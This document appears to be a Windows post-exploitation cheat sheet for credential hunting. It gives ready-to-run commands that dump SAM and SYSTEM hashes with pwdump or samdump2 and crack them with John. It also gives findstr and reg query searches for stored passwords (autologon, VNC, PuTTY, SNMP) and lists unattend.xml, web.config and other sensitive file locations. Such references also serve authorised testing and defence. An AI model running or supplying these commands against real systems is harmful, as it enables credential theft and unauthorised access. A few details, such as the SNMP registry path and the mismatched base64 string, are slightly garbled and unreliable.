# SAM and SYSTEM Files

The **Security Account Manager (SAM)** is a database file where user passwords are stored in a hashed format. These hashes are stored as either an **LM hash** or an **NTLM hash**. This file can be found in `%SystemRoot%/system32/config/SAM` and is mounted on `HKLM/SAM`.

## File Locations

- `%SYSTEMROOT%\repair\SAM`
- `%SYSTEMROOT%\System32\config\RegBack\SAM`
- `%SYSTEMROOT%\System32\config\SAM`
- `%SYSTEMROOT%\repair\system`
- `%SYSTEMROOT%\System32\config\SYSTEM`
- `%SYSTEMROOT%\System32\config\RegBack\system`

## Generate a Hash File for John Using pwdump or samdump2

1. Using `pwdump`:
    ```bash
    pwdump SYSTEM SAM > /root/sam.txt
    ```
2. Using `samdump2`:
    ```bash
    samdump2 SYSTEM SAM -o sam.txt
    ```
3. Then crack it with John:
    ```bash
    john -format=NT /root/sam.txt
    ```

---

# Search for File Contents

To search for the word `password` in various file types:

1. **Command to search:**
    ```bash
    findstr /SI /M "password" *.xml *.ini *.txt
    ```
    or:
    ```bash
    findstr /si password *.xml *.ini *.txt *.config
    ```
2. **Search recursively across all files:**
    ```bash
    findstr /spin "password" *.*
    ```

## Search for a File with a Certain Filename

You can search for files matching these patterns:

- `*pass*.txt`
- `*pass*.xml`
- `*pass*.ini`
- `*cred*`
- `*vnc*`
- `*.config*`

Example:
```bash
where /R C:\ user.txt
where /R C:\ *.ini
```

---

# Search the Registry for Key Names and Passwords

### Commands to Search Registry for Passwords

- **Search in `HKLM` (HKEY_LOCAL_MACHINE):**
    ```bash
    REG QUERY HKLM /F "password" /t REG_SZ /S /K
    ```
- **Search in `HKCU` (HKEY_CURRENT_USER):**
    ```bash
    REG QUERY HKCU /F "password" /t REG_SZ /S /K
    ```

### Specific Registry Queries

- **Autologin Settings:**
    ```bash
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    ```
- **SNMP Parameters:**
    ```bash
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
    ```
- **PuTTY Clear Text Proxy Credentials:**
    ```bash
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    ```
- **VNC Credentials:**
    ```bash
    reg query "HKCU\Software\ORL\WinVNC3\Password"
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
    ```

### Query Passwords in the Registry

- **Search for `password`:**
    ```bash
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    ```

---

# Read a Value of a Certain Sub Key

To read a registry value:

```bash
REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
```

---

# Passwords in unattend.xml

### Location of the unattend.xml Files

- `C:\unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

### Display the Content of These Files

Use this command to display the contents of these files:
```bash
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

### Example Content

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
        <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
        <Enabled>true</Enabled>
        <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
        <LocalAccounts>
            <LocalAccount wcm:action="add">
                <Password>*SENSITIVE*DATA*DELETED*</Password>
                <Group>administrators;users</Group>
                <Name>Administrateur</Name>
            </LocalAccount>
        </LocalAccounts>
    </UserAccounts>
</component>
```

Unattend credentials are stored in base64 and can be decoded manually with base64:
```bash
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
```
This will output:
```
SecretSecurePassword1234*
```

### Metasploit Module

The Metasploit module `post/windows/gather/enum_unattend` looks for these files.

---

# IIS Web Config

To search for `web.config` files in IIS:

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Common locations:
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
- `C:\inetpub\wwwroot\web.config`

---

# Other Files

Here are some other potentially sensitive files:

- `%SYSTEMDRIVE%\pagefile.sys`
- `%WINDIR%\debug\NetSetup.log`
- `%WINDIR%\repair\sam`
- `%WINDIR%\repair\system`
- `%WINDIR%\repair\software`
- `%WINDIR%\repair\security`
- `%WINDIR%\iis6.log`
- `%WINDIR%\system32\config\AppEvent.Evt`
- `%WINDIR%\system32\config\SecEvent.Evt`
- `%WINDIR%\system32\config\default.sav`
- `%WINDIR%\system32\config\security.sav`
- `%WINDIR%\system32\config\software.sav`
- `%WINDIR%\system32\config\system.sav`
- `%WINDIR%\system32\CCM\logs\*.log`
- `%USERPROFILE%\ntuser.dat`
- `%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat`
- `%WINDIR%\System32\drivers\etc\hosts`
- `C:\ProgramData\Configs\*`
- `C:\Program Files\Windows PowerShell\*`
- `dir c:*vnc.ini /s /b`
- `dir c:*ultravnc.ini /s /b`
```
